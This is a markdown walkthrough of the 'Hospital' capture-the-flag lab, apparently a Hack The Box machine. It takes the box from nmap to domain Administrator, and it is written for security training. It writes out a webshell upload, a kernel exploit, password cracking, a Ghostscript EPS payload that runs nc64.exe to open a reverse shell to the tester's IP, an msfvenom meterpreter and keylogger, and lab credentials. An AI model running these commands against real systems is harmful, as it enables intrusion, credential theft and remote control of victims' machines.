## Hospital

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, Lateral Movement, Linux, Windows

#### Enumeration
- run `nmap`
- unable to login as anonymous to `SMB`
- visit port 443, unable to login to web mail
-  visit port 8080 requires user login
#### Initial Foothold 
-  visit port 8080 requires user login
- we can create an account and login, web app allows file upload 
- we can using `burpsuite intruder` to enumerate alternative `.php` file extension to bypass the upload filter
![[file extension check.png]]
- attempt upload `.phar`
![[php info.png]]
- we can use [weevely3](https://github.com/epinna/weevely3) to get a reverse shell using allowed functions
```bash
$ weevely generate 'p4wn4g386!' backdoor.phar
Generated 'backdoor.phar' with password 'p4wn4g386!' of 764 byte size.
$ weevely http://hospital.htb:8080/uploads/backdoor.phar 'p4wn4g386!'

[+] weevely 4.0.1

[+] Target:	hospital.htb:8080
[+] Session:	/home/ch4os1/.weevely/sessions/hospital.htb/backdoor_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
- enumerating the application, found database credential
```bash
drwilliams
www-data@webserver:/var/www/html$ cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
- enumerated the `mysql` database, did not found anything useful
```sql

MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | attacker | $2y$10$Ef9sMAtf9VkqSl6pyyEVPOcHkXWVKsXgexihFV1tAWRn74SIB7C32 | 2025-09-24 14:48:46 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.000 sec)
```
#### Lateral Movement (If any)
- check system version
```bash
www-data@webserver:/$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
- search for `5.19.0-35-generic exploit github` online and found [POC](https://github.com/synacktiv/CVE-2023-35001)
```bash
$ git clone https://github.com/synacktiv/CVE-2023-35001

$ make

$ unzip lpe.zip 
Archive:  lpe.zip
replace exploit? [y]es, [n]o, [A]ll, [N]one, [r]ename: n
replace wrapper? [y]es, [n]o, [A]ll, [N]one, [r]ename: n

$ tar -cvf exploit.tar exploit wrapper 
```
- on target
```bash
www-data@webserver:/var/www$ ./exploit 
[+] Using config: 5.19.0-35-generic
[+] Recovering module base
[+] Module base: 0xffffffffc082d000
[+] Recovering kernel base
[+] Kernel base: 0xffffffffa8200000
[+] Got root !!!
# whoami
root
```
- attempted to add public key to `authorized_keys`
![[check .ssh.png]]
```bash
$ ssh drwilliams@hospital.htb -i /home/ch4os1/.ssh/id_ed25519
```
- unable to find anything interesting with user `drwilliams`
```bash
$ cat /etc/shadow
<SNIP>
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
<SNIP>
```
- get password hash of user `drwilliams` from `/etc/shadow` and crack it with `john`
```bash
$ john shadow -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qwe123!@#        (drwilliams)     
1g 0:00:00:32 DONE (2025-09-24 10:12) 0.03084g/s 6617p/s 6617c/s 6617C/s raycharles..pl@yboy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- another application is running on port 443
- we can attempt to login to `roundcube` using `drwilliams` credential
- the email is stating that the user is expecting attachment in `.eps` 
- searching for an EPS/Ghostscript exploit leads to [CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
- use payload to generate a payload and attach the payload to reply email
```bash
$ python3 CVE_2023_36664_exploit.py --inject --payload 'cmd.exe /c\\\\10.10.14.78\\nc64.exe -e cmd 10.10.14.78 4444' --filename shell.eps
[+] Payload successfully injected into shell.eps.
```
- wait for some time we get a reverse shell back
![[send email.png]]
#### Privilege Escalation
- reverse shell back on `nc` as user `drbrown`
```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.78] from (UNKNOWN) [10.129.239.105] 23345
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\drbrown.HOSPITAL\Documents>whoami
whoami
hospital\drbrown
```
- found database connection string but unable to utilize the credential 
```bash
PS C:\xampp\htdocs\config> cat config.inc.php
<?php

/* Local configuration for Roundcube Webmail */

// ----------------------------------
// SQL DATABASE
// ----------------------------------
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// Note: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
// Note: Various drivers support various additional arguments for connection,
//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
//       for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service.
//       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
$config['db_dsnw'] = 'mysql://RoundCube:R0undCub3123%21@localhost/roundcube';

// Log sent messages to <log_dir>/sendmail.log or to syslog
$config['smtp_log'] = false;
```
- check running processes
```bash
:\Users\drbrown.HOSPITAL\Documents>powershell Get-Process
powershell Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------            <SNIP>
    708      46    12676      10540       1.47   1776   1 iexplore                                                     
    815      65    38264      39104      18.47   2436   1 iexplore        
```
- use `msfconsole` to check running `key-logger` to capture user input
- use `msfvenom` to generate 
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.78 LPORT=9005 -f exe > shell.exe
```
- load the payload using smbclient like below
```bash
$ impacket-smbserver smbshare $(pwd) -smb2support
```
- copy from share to target
```powershell
copy \\10.10.14.78\smbshare\shell.exe
```
- on `msfconsole`, migrate to the browser process then run key-logger
```bash
(Meterpreter 1)(C:\Users\drbrown.HOSPITAL\Documents) > migrate 1776
[*] Migrating from 1148 to 1776...
[*] Migration completed successfully.
(Meterpreter 1)(C:\Users\drbrown.HOSPITAL\Desktop) > keyscan_start
Starting the keystroke sniffer ...
## wait for couple of minutes
(Meterpreter 1)(C:\Users\drbrown.HOSPITAL\Desktop) > keyscan_dump
Dumping captured keystrokes...
Th3b3stH0sp1t4l9786!
```
- check password with `nxc`
- we have `(Pwn3d!)` access
```bash
$ nxc smb 10.129.239.105 -u Administrator -p 'Th3B3stH0sp1t4l9786!' 
SMB         10.129.239.105  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.239.105  445    DC               [+] hospital.htb\Administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
```
- use `evil-winrm` to get reverse shell as `Administrator`
```bash
$ evil-winrm -u Administrator -p 'Th3B3stH0sp1t4l9786!' -i 10.129.239.105
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/24/2025   4:33 PM             34 root.txt
```
#### Resources

#### Lesson Learned
